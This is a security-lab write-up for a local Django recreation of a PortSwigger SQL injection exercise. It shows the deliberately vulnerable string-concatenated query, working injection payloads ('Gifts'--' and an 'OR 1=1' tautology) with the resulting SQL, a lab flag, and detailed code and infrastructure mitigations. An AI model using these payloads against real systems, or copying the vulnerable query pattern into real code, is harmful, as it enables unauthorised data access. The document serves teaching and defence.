# Lab 01 — SQL injection in WHERE clause allowing retrieval of hidden data

## 1. Lab overview

| Field | Value |
| --- | --- |
| PortSwigger reference | <https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data> |
| Lab id | `psw-sqli-01-hidden-data` |
| Vulnerability class | SQL Injection — WHERE-clause logic tampering |
| CWE | [CWE-89 — Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html) |
| Backend | SQLite (single-service Django app) |
| Host URL | <http://127.0.0.1:18001/> |
| Flag | `FLAG{psw-sqli-01-where-clause-hidden-gems}` |

### Objective

A shop lists products by category. Only rows where `released = 1` are meant to be visible. Hidden among the unreleased rows is a "Classified Dossier" whose description carries the flag. The attacker has to tamper with the category filter so the `released = 1` constraint is neutered and the hidden row is returned.

---

## 2. Exploit walkthrough

The category value is substituted directly into the `WHERE` clause after a single quote. Breaking out of the quoted string and commenting out the rest of the clause neutralises the `released = 1` condition.

**Step 1 — baseline request (benign)**

```http
GET /filter?category=Gifts HTTP/1.1
Host: 127.0.0.1:18001
```

The server executes:

```sql
SELECT id, name, category, description, price, released
FROM products
WHERE category = 'Gifts' AND released = 1
```

Only three "Gifts" products are listed.

**Step 2 — inject to bypass the `released = 1` filter**

```http
GET /filter?category=Gifts'--+ HTTP/1.1
Host: 127.0.0.1:18001
```

URL-decoded: `category=Gifts'-- ` (the trailing space after `--` is mandatory in SQLite/PostgreSQL).

Executed SQL becomes:

```sql
SELECT id, name, category, description, price, released
FROM products
WHERE category = 'Gifts'-- ' AND released = 1
```

Everything after `--` is a comment. Unreleased rows in the "Gifts" category are now returned, including the flag-bearing row.

**Step 3 — alternative: return every row regardless of category**

```
/filter?category=' OR 1=1--+
```

Which becomes:

```sql
WHERE category = '' OR 1=1-- ' AND released = 1
```

This dumps the entire `products` table in one shot.

The `executed_sql` debug field on the response page echoes the concatenated query, so the learner can confirm the shape of the injection directly in the browser.

---

## 3. Vulnerable code

### Endpoint: `GET /filter`

[shop/views.py:47-54](shop/views.py#L47-L54)

```python
def filter_products(request: HttpRequest) -> HttpResponse:
    category = request.GET.get("category", "")

    query = (
        "SELECT id, name, category, description, price, released "
        "FROM products "
        "WHERE category = '" + category + "' AND released = 1"
    )
```

Three things are broken at once:

1. `category` is taken from user input (`request.GET`) with no validation and no escaping.
2. It is concatenated into a raw SQL string — the query text is being *built* from untrusted input rather than being *parameterised*.
3. The quoting is done with a literal single quote, which any attacker-supplied `'` or `--` can escape.

[shop/views.py:56-58](shop/views.py#L56-L58)

```python
    with connection.cursor() as cursor:
        cursor.execute(query)
        rows = cursor.fetchall()
```

`cursor.execute(query)` — called with **one** argument — passes the whole pre-built string straight to the DB driver, so the driver has no opportunity to know which parts are data and which parts are code.

### Supporting model

[shop/models.py:4-19](shop/models.py#L4-L19) — the `released` flag is the business-logic gate the query tries (and fails) to enforce.

### Seeded data

[shop/management/commands/seed.py:35](shop/management/commands/seed.py#L35) — the flag-bearing row is seeded with `released=False`, so it can only be reached by a query that drops the `AND released = 1` predicate.

---

## 4. Why the vulnerability exists

| Root cause | Effect |
| --- | --- |
| **String concatenation of untrusted input into SQL** | The DB driver cannot distinguish code from data. Attacker-supplied quotes/comments rewrite the query. |
| **No allow-list or type check on `category`** | Any byte sequence reaches the query, including `'`, `--`, `;`, `UNION`, etc. |
| **Business-logic security control (`released = 1`) lives inside the same concatenated string** | A single injection point disables both the category filter *and* the visibility gate. |
| **Debug reflection of the executed SQL** (intentional for the lab) | In a real app, echoing the composed SQL back to the client leaks schema. |

---

## 5. Code-level mitigation

### 5.1 Use parameterised queries

The DB driver binds the parameter as data, so quotes and comments lose their syntactic meaning. The canonical fix is a single character change: pass values in the second argument.

```python
# shop/views.py — fixed
def filter_products(request: HttpRequest) -> HttpResponse:
    category = request.GET.get("category", "")

    query = (
        "SELECT id, name, category, description, price, released "
        "FROM products "
        "WHERE category = %s AND released = 1"
    )
    with connection.cursor() as cursor:
        cursor.execute(query, [category])     # NOTE the list argument
        rows = cursor.fetchall()
```

With the value bound, `category=Gifts'-- ` is matched *literally* against the `category` column — nothing matches, an empty result set comes back.

### 5.2 Prefer the ORM over raw SQL

The real remediation is to stop hand-rolling SQL:

```python
from .models import Product

def filter_products(request: HttpRequest) -> HttpResponse:
    category = request.GET.get("category", "")
    products = (
        Product.objects
        .filter(category=category, released=True)
        .values("id", "name", "category", "description", "price", "released")
    )
```

Django's query compiler always binds parameters. This also removes the duplicated `released = 1` predicate from the template-string layer.

### 5.3 Input validation

Business logic tells us `category` is drawn from a small, known set. Reject anything else before the query runs:

```python
ALLOWED_CATEGORIES = {"Accessories", "Tech", "Lifestyle", "Gifts", "Pets", "Clothing"}

def filter_products(request):
    category = request.GET.get("category", "")
    if category not in ALLOWED_CATEGORIES:
        return HttpResponseBadRequest("unknown category")
    ...
```

Validation is defense-in-depth: parameterisation stops injection, validation stops malformed input from reaching the query layer at all and also prevents enumeration of internal taxonomy.

### 5.4 Stop reflecting the executed SQL

Remove the `executed_sql` context variable and the template block that renders it. Query text in error pages is useful in a lab and dangerous in production.

### 5.5 Enforce "not released" at the schema layer as well

Don't let a single forgotten `WHERE` predicate expose embargoed data. Put unreleased rows in a separate table, or use a row-level security policy, or a database view:

```sql
CREATE VIEW public_products AS
SELECT * FROM products WHERE released = 1;
```

Then have the app query `public_products` instead of `products`. Any future query that forgets the visibility filter still cannot see the hidden rows, because the view has it baked in.

---

## 6. Network / infrastructure-level mitigation

Even a perfectly written app benefits from layered defences.

### 6.1 Web Application Firewall (WAF)

Deploy a WAF in front of the app with the OWASP Core Rule Set (CRS). Rules that are relevant here:

- `REQUEST-942` — SQL injection detection (matches `'--`, `OR 1=1`, `UNION SELECT`, tautologies).
- `REQUEST-920` — protocol enforcement (rejects non-UTF-8, oversized query strings).
- `REQUEST-932` — remote command injection (protects against chained exploitation).

A WAF is **not a substitute** for fixing the code. Determined attackers bypass signature-based rules. Treat it as one layer.

### 6.2 Least-privilege database account

The application database user should have:

- `SELECT` on the tables it must read.
- No `DDL` rights (no `CREATE`, `ALTER`, `DROP`).
- No access to system catalogs it doesn't need (`pg_shadow`, `information_schema` can be restricted via Postgres roles; in SQLite this is achieved by simply not having a shared process).
- No `FILE`-level privileges (`LOAD_FILE`, `INTO OUTFILE` on MySQL; `COPY` on Postgres).

### 6.3 Network segmentation & egress control

- The DB listens only on `127.0.0.1` or on the private Docker network — never on a public interface.
- Outbound connections from the DB container are blocked (`--network=internal` or a custom bridge with no default gateway) so that even if a future injection pivots to `xp_cmdshell` or `COPY PROGRAM`, it can't reach the internet.
- The app container itself exposes `127.0.0.1:18001:8000` in `docker-compose.yml:10` — that loopback-only binding is the first line of defence for a local lab.

### 6.4 Monitoring & rate limiting

- Log every 4xx/5xx and every query that throws a SQL error. A spike of parse errors on `/filter` is a strong injection signal.
- Rate-limit `/filter` per client IP to slow automated tooling.
- Alert on response bodies containing suspiciously long comma-separated result sets from an endpoint that should return small pages.

### 6.5 Content Security Policy / Subresource Integrity

Not directly relevant to SQLi, but the same endpoint would be an XSS sink if the attacker injects `<script>` through a different column; a strict CSP limits the damage.

---

## 7. Defense-in-depth checklist

- [ ] Parameterised queries everywhere (no `+` / `%` / f-string SQL builders).
- [ ] ORM by default; raw SQL only where justified and code-reviewed.
- [ ] Input validation for known-enumerable fields (allow-list).
- [ ] Business-logic gates (`released`, ownership, tenant id) enforced in the schema, not only in the query string.
- [ ] Separate DB role per application with least privilege.
- [ ] Application cannot make outbound connections from the DB tier.
- [ ] WAF in front of the application.
- [ ] Query errors are **not** reflected to the client.
- [ ] Structured logging of SQL errors with alerting.
- [ ] Regular automated SAST (`bandit`, `semgrep`) catching `cursor.execute(f"...")` and `cursor.execute("..." + x)` patterns.

---

## 8. References

- PortSwigger Web Security Academy — [SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)
- OWASP — [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- CWE-89 — <https://cwe.mitre.org/data/definitions/89.html>
- Django docs — [Executing custom SQL directly](https://docs.djangoproject.com/en/5.0/topics/db/sql/#executing-custom-sql-directly) (note the warning about parameter substitution)
- OWASP CRS — <https://coreruleset.org/>
